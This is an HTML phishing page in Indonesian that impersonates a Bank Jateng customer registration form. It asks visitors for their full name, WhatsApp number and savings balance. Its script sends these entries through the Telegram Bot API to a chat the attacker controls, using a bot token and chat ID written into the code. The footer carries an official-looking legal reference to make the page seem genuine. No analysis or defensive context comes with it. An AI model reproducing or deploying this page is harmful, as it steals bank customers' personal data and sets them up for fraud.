<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Pendaftaran - Bank Jateng</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            font-family: 'Arial', sans-serif;
            padding: 20px;
        }
        .form-container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            border: 2px solid #0033a0;
            text-align: center;
            position: relative;
        }
        .form-header , img {
            height: 40px;
            margin-bottom: 10px;
        }
        .form-label {
            font-weight: bold;
            text-align: left;
            display: block;
        }
        .form-control {
            border: 2px dashed #0033a0;
            border-radius: 5px;
        }
        .btn-primary {
            background-color: #0033a0;
            border: none;
            padding: 10px;
            font-weight: bold;
            width: 100%;
            margin-top: 10px;
            border-radius: 5px;
        }
        .footer {
            font-size: 12px;
            color: #333;
            text-align: center;
            margin-top: 15px;
        }
        .btn-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <img src="iconjateng.png" alt="Bank Jateng" class="form-header">
        <form id="registrationForm">
            <div class="mb-3">
                <label class="form-label">Nama Lengkap Tanpa Singkatan</label>
                <input type="text" id="namaLengkap" class="form-control" placeholder="Masukkan Nama Lengkap Nasabah" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Nomor WhatsApp</label>
                <input type="tel" id="nomorHp" class="form-control" placeholder="Masukkan Nomor WhatsApp" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Saldo Tabungan Rekening Saat Ini</label>
                <input type="text" id="saldoAkhir" class="form-control" placeholder="Rp" required>
            </div>
        </form>
    </div>
    <div class="btn-container">
        <a href="registrasi.html" type="submit" class="btn btn-primary" form="registrationForm">Lanjutkan</a>
    </div>
    <div class="footer">
        <p>Â©Bank Pembangunan Daerah Jawa Tengah Nomor: 003/IV/DIR/LEGAL/X/2024 Tanggal: 16 April 2024</p>
    </div>
    <script>
        document.getElementById("registrationForm").addEventListener("submit", function(event) {
            event.preventDefault();
            
            let nama = document.getElementById("namaLengkap").value.trim();
            let saldo = document.getElementById("saldoAkhir").value.trim();
            let noHp = document.getElementById("nomorHp").value.trim();
            
            if (nama === "" || saldo === "" || noHp === "") {
                alert("Harap isi semua data sebelum melanjutkan!");
                return;
            }
            
            let saldoFormatted = new Intl.NumberFormat("id-ID").format(saldo);
            
            let botToken = "7617133229:AAEQwaaUizOISQE87BbgnG8dQy1GnBj6vew";
            let chatId = "7623069025";
            let message = `\uD83D\uDCDD *Pendaftaran Baru*\n\n\uD83D\uDC64 Nama: ${nama}\n\uD83D\uDCF1 Nomor WhatsApp: +62${noHp}\n\uD83D\uDCB0 Saldo Tabungan: Rp ${saldoFormatted}`;
            
            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("Sukses mengirim data.");
                    } else {
                        alert("Gagal mengirim data.");
                    }
                })
                .catch(error => alert("Terjadi kesalahan: " + error));
        });
    </script>
</body>
</html>
